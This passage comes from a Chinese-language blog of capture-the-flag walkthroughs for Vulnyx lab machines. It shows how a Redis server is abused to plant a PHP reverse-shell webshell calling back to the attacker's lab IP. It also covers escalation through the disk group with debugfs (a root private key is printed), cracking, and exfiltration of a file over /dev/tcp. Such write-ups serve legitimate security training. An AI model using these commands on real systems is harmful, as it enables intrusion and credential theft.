class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.34&quot;</span>     <br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /miaosec/reports/http_192.168.2.34/_26-01-06_14-28-48.txt<br><br>Target: http://192.168.2.34/<br><br>[14:28:48] Starting: <br>[14:28:51] 403 -  277B  - /.ht_wsr.txt<br>[14:28:51] 403 -  277B  - /.htaccess.orig<br>[14:28:51] 403 -  277B  - /.htaccess.sample<br>[14:28:51] 403 -  277B  - /.htaccess.save<br>[14:28:51] 403 -  277B  - /.htaccess_extra<br>[14:28:51] 403 -  277B  - /.htaccess_orig<br>[14:28:51] 403 -  277B  - /.htaccessOLD<br>[14:28:51] 403 -  277B  - /.htaccess_sc<br>[14:28:51] 403 -  277B  - /.htaccessBAK<br>[14:28:51] 403 -  277B  - /.htaccessOLD2<br>[14:28:51] 403 -  277B  - /.htm<br>[14:28:51] 403 -  277B  - /.html<br>[14:28:51] 403 -  277B  - /.htpasswd_test<br>[14:28:51] 403 -  277B  - /.httr-oauth<br>[14:28:51] 403 -  277B  - /.htpasswds<br>[14:28:52] 403 -  277B  - /.php<br>[14:28:55] 403 -  277B  - /.htaccess.bak1<br>[14:29:55] 403 -  277B  - /server-status<br>[14:29:55] 403 -  277B  - /server-status/<br><br>Task Completed<br></code></pre></td></tr></table></figure><h2 id="2、8080端口"><a href="#2、8080端口" class="headerlink" title="2、8080端口"></a>2、8080端口</h2><h3 id="1、网站"><a href="#1、网站" class="headerlink" title="1、网站"></a>1、网站</h3><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601061510105.png"></p><h3 id="2-目录扫描-1"><a href="#2-目录扫描-1" class="headerlink" title="2-目录扫描"></a>2-目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# dirsearch -u <span class="hljs-string">&quot;http://192.168.2.34:8080&quot;</span><br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /miaosec/reports/http_192.168.2.34_8080/_26-01-06_14-31-48.txt<br><br>Target: http://192.168.2.34:8080/<br><br>[14:31:48] Starting: <br>[14:31:50] 403 -  279B  - /.ht_wsr.txt<br>[14:31:50] 403 -  279B  - /.htaccess.bak1<br>[14:31:50] 403 -  279B  - /.htaccess.orig<br>[14:31:50] 403 -  279B  - /.htaccess_extra<br>[14:31:50] 403 -  279B  - /.htaccess.save<br>[14:31:50] 403 -  279B  - /.htaccess.sample<br>[14:31:50] 403 -  279B  - /.htaccessBAK<br>[14:31:50] 403 -  279B  - /.htaccess_sc<br>[14:31:50] 403 -  279B  - /.htaccess_orig<br>[14:31:50] 403 -  279B  - /.htaccessOLD<br>[14:31:50] 403 -  279B  - /.htaccessOLD2<br>[14:31:50] 403 -  279B  - /.htm<br>[14:31:50] 403 -  279B  - /.html<br>[14:31:50] 403 -  279B  - /.htpasswd_test<br>[14:31:50] 403 -  279B  - /.htpasswds<br>[14:31:50] 403 -  279B  - /.httr-oauth<br>[14:31:52] 403 -  279B  - /.php<br>[14:32:57] 403 -  279B  - /server-status<br>[14:32:57] 403 -  279B  - /server-status/<br><br>Task Completed<br></code></pre></td></tr></table></figure><h2 id="3、6379端口"><a href="#3、6379端口" class="headerlink" title="3、6379端口"></a>3、6379端口</h2><p>6379端口开放的服务是<code>redis</code></p><p>💡Tip：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://book.hacktricks.wiki/zh/network-services-pentesting/6379-pentesting-redis.html<br></code></pre></td></tr></table></figure><p>直接进行连接redis服务，可以正常进行交互</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# redis-cli -h 192.168.2.34<br>192.168.2.34:6379&gt; info<br><span class="hljs-comment"># Server</span><br>redis_version:6.0.16<br>...<br></code></pre></td></tr></table></figure><h3 id="1-写入webshell"><a href="#1-写入webshell" class="headerlink" title="1-写入webshell"></a>1-写入webshell</h3><p>由于存在多个web服务器，直接尝试写入webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.2.34:6379&gt; config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/www/html<br>OK<br>192.168.2.34:6379&gt; config <span class="hljs-built_in">set</span> dbfilename rev.php<br>OK<br>192.168.2.34:6379&gt; <span class="hljs-built_in">set</span> rev <span class="hljs-string">&quot;&lt;?php exec(&#x27;busybox nc 192.168.2.4 4444 -e /bin/bash&#x27;);?&gt;&quot;</span><br>OK<br>192.168.2.34:6379&gt; save<br>OK<br></code></pre></td></tr></table></figure><p>访问<code>rev.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# curl http://192.168.2.34:8080/rev.php <br></code></pre></td></tr></table></figure><p>成功获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.34] 42828<br><span class="hljs-built_in">id</span><br>uid=1000(ben) gid=1000(ben) <span class="hljs-built_in">groups</span>=1000(ben),6(disk)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">script /dev/null -c bash<br>Ctrl+Z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 36 columns 178<br></code></pre></td></tr></table></figure><h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><p>查看用户<code>ben</code>的id，发现用户<code>ben</code>属于<code>disk</code>组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ben@ready:/tmp$ <span class="hljs-built_in">id</span><br>uid=1000(ben) gid=1000(ben) <span class="hljs-built_in">groups</span>=1000(ben),6(disk)<br></code></pre></td></tr></table></figure><h2 id="1、disk组"><a href="#1、disk组" class="headerlink" title="1、disk组"></a>1、disk组</h2><p><strong>disk</strong> 组成员可直接操作磁盘设备，攻击者可通过磁盘操作访问敏感文件（如 <code>/etc/shadow</code>）或修改分区表。</p><p>使用 <code>debugfs</code> 访问磁盘分区：</p><ol><li><p>查看磁盘分区，找到分区<code>/dev/sda1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">ben@ready:/tmp$ <span class="hljs-built_in">df</span><br>Filesystem     1K-blocks    Used Available Use% Mounted on<br>/dev/sda1        7173040 1486168   5301132  22% /<br>udev              483648       0    483648   0% /dev<br>tmpfs             499948       0    499948   0% /dev/shm<br>tmpfs              99992     488     99504   1% /run<br>tmpfs               5120       0      5120   0% /run/lock<br></code></pre></td></tr></table></figure></li><li><p>使用<code>debugfs</code>访问磁盘<code>/dev/sda1</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ben@ready:/tmp$ /usr/sbin/debugfs /dev/sda1<br>debugfs 1.46.2 (28-Feb-2021)<br></code></pre></td></tr></table></figure></li><li><p>查看敏感文件<code>/root/.ssh/id_rsa</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">debugfs:  <span class="hljs-built_in">cat</span> /root/.ssh/authorized_keys<br>REDIS0009�      redis-ver6.0.16�<br>�edis-bits�@�ctime�(�\iused-mem��<br> aof-preamble���crack@[ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBj5fESTr1FJVwvX47OzCUmh3LjoPZuwmGxeXO4RiaHD root@kali<br>debugfs:  <span class="hljs-built_in">cat</span> /root/.ssh/id_ed25519     <br>/root/.ssh/id_ed25519: File not found by ext2_lookup <br>debugfs:  <span class="hljs-built_in">cat</span> /root/.ssh/id_rsa    <br>-----BEGIN RSA PRIVATE KEY-----<br>Proc-Type: 4,ENCRYPTED<br>DEK-Info: DES-EDE3-CBC,02E266E7A66462FE<br><br>tTN5G66QaZHsjOSYG8pFEQqUJUC4lw+WzHs3hbml1+zuLPmnDvUapYFB/4IgQNG2<br>jp1tebAwENVz/CdS3paB60NB9uosYXHa60Sbi7a31Ej6QqH10UnN/NROSEhqZkt+<br>dUcQspoDJIvHyvdhm4lIVizfvw1i9epxY+aB9W7vscpN1HAq37WdOn62nnEccLRs<br>wShZgOeOLTUo5j+C0oQZDi11ZJxEFiwwCFkOqZ+ZEQgshQqgG8PjMvedwuQcFjpN<br>wgFyQl0ZzGTzaj1iZntc/7G1/9WqXyk3IkpICucALCaSlCZ3Oh0kJd12W27vTKdO<br>kBpXNU8cgjc+jbIKveFZe6+ZuMwr3Lb9p+f+m7ktcTk/AFxSObuFnHBZN52VE/F4<br>lVK8vR7Om8qg34REgbvkmrBttg7x4AzUsTZ1WPPJqu3VS0SGVyq8vkpA2ngHmMBC<br>h3Ca0Xjua55GzCFBGePrQmqOd8jKZ0W6HBfCQyGB/dGg57mKNQy1OSIR4XtFYDYN<br>wNGTgr4KPebWf1CYRg2nleu3DD3sezutvoVMLJdzoeaLrCPX0pdfEhBase7n72Gy<br>Q6zqrk07p5GQeuL3tfhBsbHqgK899IMPr2VZPwvaoibDF66UJ1unfEXiPzTTHDo9<br>5MTR1GK7HYnmtypx3OpCDJMFGwaJgx+o944cxX9DQ63pgwx1R34RoQRfIgqUUrsG<br>NhEkLvrYFMnlK/dSmouuNFvd868zBlMByQyVYoepyHGhsGDuAP4Mhx7L1Gbj4dRS<br>dMgfgLN0lM0G+P9QvmmX7TuH1MU1IIfZZw9dCfdUqVVKyegA2RQ7fZG9D8o3l1J0<br>bIj0VJE7ykqqZEndzgBGRw3bEu3/OKpJM2UFqr/pPlu1w1bVIzHrTPNI5nk6dm77<br>n/TqwSgU2EQDWK88Z8TORZvuoNA3FelyzxCfRC2HLv0+QrVbyY7dLf3oLH0Zq+gK<br>1OYVrTKbe4pu0J2R7jZw20pLWeEZPuSE3RmVwcSsVzwb6dBk5rMkwCE5gG1qNh1U<br>koCqtHzXveisx5I7KrvBj5RTaK/aPX/v8BS/oh8AmiQr2Pqq9K+aQScP2XYh691x<br>yfVoFGJrZMcG5VD3QxrgWamgcHhug2LotpRbxjc777uK/muI9rUSQLYC06H2Cdf/<br>kRUH9Ohf3ZrVXpcCMhuCBbOxYBr+TAGjwJIBAYuFMBqhZ4gyaZhxJMCBhQOJHy6c<br>xR2cUdOAUh9lY40/o0Pwf+5GWiX2u5KmzcZ9iLdJ4NtgYiYMjGMe+0G37PdCXJvG<br>D+VsowoqCou916TMZUKpYSkzj8q3GLSib6CumVzKDesMLaYiZTOd1ShBqTlYjorp<br>Dlo5vrgUFk17OS8n0gtQuavBvN+2aM6gMOgiJrXfeLjzPGoY2ypHyNlbp/JI0/Y+<br>DfE+2kNqriAlvZps1mllIKITk1wNPQ3PVuBW9DkvrSUW7Ye+oMK3WoiQkY4qyu+2<br>pN0okmXmT5ygTq9KBQUEtjU8RnY27y34nYwCQus0HCA+FfRoxDbJYl0sN2g/Mzjq<br>PWVlSZLxzcya8sxPBA8gto3H5BxFnTxRXbCBTjTL09imi3QMl9K1emUlG8rSpBsI<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure></li></ol><h2 id="2、RSAcrack爆破"><a href="#2、RSAcrack爆破" class="headerlink" title="2、RSAcrack爆破"></a>2、RSAcrack爆破</h2><ol start="4"><li>发现这个私钥是加密<code>Proc-Type: 4,ENCRYPTED</code>的，需要密码才能使用，使用<a href="https://github.com/d4t4s3c/RSAcrack">RSAcrack</a>进行密码破解，找到密码<code>shelly</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec/RSAcrack-main]<br>└─# ./RSAcrack -k /tmp/id_rsa -w /tools/wordlist/pass.txt <br><br> ╭━━━┳━━━┳━━━╮          ╭╮  <br> ┃╭━╮┃╭━╮┃╭━╮┃          ┃┃  <br> ┃╰━╯┃╰━━┫┃ ┃┣━━┳━┳━━┳━━┫┃╭╮<br> ┃╭╮╭┻━━╮┃╰━╯┃╭━┫╭┫╭╮┃╭━┫╰╯╯<br> ┃┃┃╰┫╰━╯┃╭━╮┃╰━┫┃┃╭╮┃╰━┫╭╮╮<br> ╰╯╰━┻━━━┻╯ ╰┻━━┻╯╰╯╰┻━━┻╯╰╯<br>─────────────────────────────<br> code: d4t4s3c   ver: v1.0.0<br>─────────────────────────────<br>[i] Cracking | /tmp/id_rsa<br>[i] Wordlist | /tools/wordlist/pass.txt<br>[*] Status   | 1415/10003/14%/shelly<br>[+] Password | shelly<br>─────────────────────────────<br></code></pre></td></tr></table></figure></li></ol><p>使用私钥进行登录即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh root@192.168.2.34 -i id_rsa<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;root&#x27;</span>: <br>Linux ready 5.10.0-16-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 root@ready:~#</span><br></code></pre></td></tr></table></figure><p>发现<code>root.txt</code>被压缩成<code>root.zip</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ready:~# <span class="hljs-built_in">ls</span> -l<br>total 4<br>-rw------- 1 root root 225 abr 18  2023 root.zip<br></code></pre></td></tr></table></figure><p>将文件传输到kali</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lp 4444 &gt; root.zip              <br>listening on [any] 4444 ...<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ready:~# <span class="hljs-built_in">cat</span> root.zip &gt; /dev/tcp/192.168.2.4/4444<br></code></pre></td></tr></table></figure><p>使用 <a href="https://linuxcommandlibrary.com/man/zip2john">zip2john</a> 破解<code>root.zip</code>，找到<code>root.zip</code>的密码为<code>already</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kali)-[/tmp]<br>└─# zip2john root.zip &gt;hash<br><br>┌──(root㉿kali)-[/tmp]<br>└─#john <span class="hljs-comment">--wordlist=/opt/rockyou.txt hash</span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (PKZIP [<span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br>already          (root.zip/root.txt)  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# unzip root.zip <br>Archive:root.zip<br>[root.zip] root.txtpassword:<br>replace root.txt?[y]es,[n]o,[A]ll,[N]one,[r]ename:y<br>inflating: root.txt<br></code></pre></td></tr></table></figure><h1 id="四、查看FLAG"><a href="#四、查看FLAG" class="headerlink" title="四、查看FLAG"></a>四、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> root.txt /home/ben/user.txt<br>cf537b04dd79e859816334b89e85c435<br>e5d3f520423fdef77195ac688ecc27cb<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnyx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
      <tag>提权-disk组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Alpine</title>
    <link href="/Vulnyx/Alpine/"/>
    <url>/Vulnyx/Alpine/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://vulnyx.com/">https://vulnyx.com/</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 09:30 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00053s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00029s latency).<br>MAC Address: 08:00:27:CC:CD:C8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.33<br>Host is up (0.00084s latency).<br>MAC Address: 08:00:27:89:FE:07 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.09 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.33</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.33                        <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 09:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.33<br>Host is up (0.00061s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:89:FE:07 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.94 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.33 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 09:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.33<br>Host is up (0.00082s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 10.2 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.66<br>|_http-title: Did not follow redirect to http://alpine.nyx/<br>|_http-server-header: Apache/2.4.66 (Unix)<br>MAC Address: 08:00:27:89:FE:07 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: Host: default<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.58 seconds<br></code></pre></td></tr></table></figure><p>找到一个域名：<code>alpine.nyx</code></p><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.33                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 09:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.33<br>Host is up (0.0030s latency).<br>All 100 scanned ports on 192.168.2.33 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 100 closed udp ports (port-unreach)<br>MAC Address: 08:00:27:89:FE:07 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 98.12 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h2><p>扫描<code>alpine.nyx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://alpine.nyx -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md,db,js<br>...<br>/index.html           (Status: 200) [Size: 12461]<br>/.html                (Status: 403) [Size: 313]<br>/login.html           (Status: 200) [Size: 3182]<br>/profile.html         (Status: 200) [Size: 9571]<br>/booking.html         (Status: 200) [Size: 3217]<br>/.html                (Status: 403) [Size: 313]<br>/server-status        (Status: 403) [Size: 313]<br>...<br></code></pre></td></tr></table></figure><h2 id="2、信息泄露"><a href="#2、信息泄露" class="headerlink" title="2、信息泄露"></a>2、信息泄露</h2><p>访问<code>/login.html</code>，查看页面源码发现账号和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- TODO: Remove <span class="hljs-built_in">test</span> credentials before going live --&gt; <br>&lt;!-- portal <span class="hljs-built_in">test</span> user: testuser / WinterIsComing! 